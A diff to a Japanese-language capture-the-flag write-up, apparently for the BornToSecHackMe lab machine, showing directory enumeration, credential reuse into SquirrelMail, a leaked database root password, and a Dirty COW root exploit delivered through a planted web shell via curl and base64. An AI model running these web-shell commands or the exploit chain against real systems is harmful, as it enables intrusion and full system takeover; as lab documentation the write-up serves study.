@@ -29,7 +29,13 @@ nmap -A -p- 100.64.1.32
 
 ### HTTP (Port 80)
 ブラウザでアクセスすると "Hack me if you can" というタイトルの「Coming Soon」ページが表示されるのみ。
-ディレクトリ探索ツール (`gobuster`) を使用した結果、`/forum` ディレクトリを発見したが、HTTP経由では `403 Forbidden` となりアクセスできなかった。
+ディレクトリ探索ツール (`gobuster`) を使用し、隠しディレクトリを調査した。
+
+```bash
+gobuster dir -u http://100.64.1.32/ -w scripts/common.txt
+```
+
+その結果、`/forum` ディレクトリを発見したが、HTTP経由では `403 Forbidden` となりアクセスできなかった。
 
 ### HTTPS (Port 443)
 HTTPS経由で以下のURLにアクセス可能であることが判明した。
@@ -65,19 +71,25 @@ Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\
 *   **Email:** `laurie@borntosec.net`
 
 ### WebメールへのログインとDB情報の奪取
-入手したメールアドレス `laurie@borntosec.net` と上記のパスワードを使用して、`https://100.64.1.32/webmail/` (SquirrelMail) へのログインに成功した。
+掲示板で入手した認証情報が他のサービスでも使い回されている可能性を考慮し、Webメール (`SquirrelMail`) へのログインを試みた。
 
-受信トレイを確認したところ、データベースへのアクセス情報が記載されたメールを発見した。
+1.  **ログイン情報の入力:**
+    *   **URL:** `https://100.64.1.32/webmail`
+    *   **ユーザー:** `laurie@borntosec.net`
+    *   **パスワード:** `!q\]Ej?*5K5cy*AJ`
 
-**メール内容:**
-> Subject: DB Access
-> From: qudevide@mail.borntosec.net
->
-> Hey Laurie,
->
-> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+2.  **情報の発見:**
+    ログイン後、受信トレイを確認したところ、管理者から送信されたデータベースへのアクセス情報が記載されたメール（件名: "DB Access"）を発見した。
 
-これにより、データベース管理用の特権アカウントを入手した。
+    **メール内容:**
+    > Subject: DB Access
+    > From: qudevide@mail.borntosec.net
+    >
+    > Hey Laurie,
+    >
+    > You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+これにより、データベースおよび phpMyAdmin へのフルアクセス権限を持つ特権アカウントを入手した。
 *   **DB User:** `root`
 *   **DB Password:** `Fg-'kKXBj87E:aJ$`
 
@@ -129,25 +141,32 @@ cat /etc/issue
 `/etc/passwd` ファイルを書き換えるタイプの Dirty COW exploit (通称 "Firefart") を使用することにした。
 
 1.  **Exploitコードの転送:**
-    ターゲットマシンはインターネット接続が可能であったため、Web Shell 経由で `curl` コマンドを実行し、GitHub から直接ソースコードを取得した。
-    ```bash
-    curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c
-    ```
+    ターゲットマシン上での `curl` による直接ダウンロードが失敗（SSLの互換性やネットワーク制限のため）したため、ローカルでソースコードを Base64 エンコードし、Web Shell を通じてターゲットへ送信する手法をとった。
 
+    **実行コマンド:**
     ```bash
-    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php"   --data-urlencode "c=curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c"
+    # 1. ローカルでファイルをエンコード
+    B64_DIRTY=$(base64 -w 0 scripts/dirty.c)
+
+    # 2. Web Shell 経由でターゲットに送信し、デコードして保存
+    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php" \
+        --data-urlencode "c=echo \"$B64_DIRTY\" | base64 -d > /tmp/dirty.c"
     ```
 
 2.  **コンパイル:**
     ターゲット上で `gcc` を使用してコンパイルを実行した。
     ```bash
-    gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt
+    # Web Shell 経由で実行
+    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php" \
+        --data-urlencode "c=gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt"
     ```
 
 3.  **実行:**
-    新しい root ユーザー (`firefart` または指定した名前) のパスワードを設定して実行した。ここではパスワードを `gemini` とした。
+    新しい root ユーザー (`toor`) のパスワードを設定して実行した。ここではパスワードを `gemini` とした。
     ```bash
-    /tmp/dirty gemini
+    # Web Shell 経由で実行
+    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php" \
+        --data-urlencode "c=/tmp/dirty gemini"
     ```
 
 ### Root 権限の獲得確認
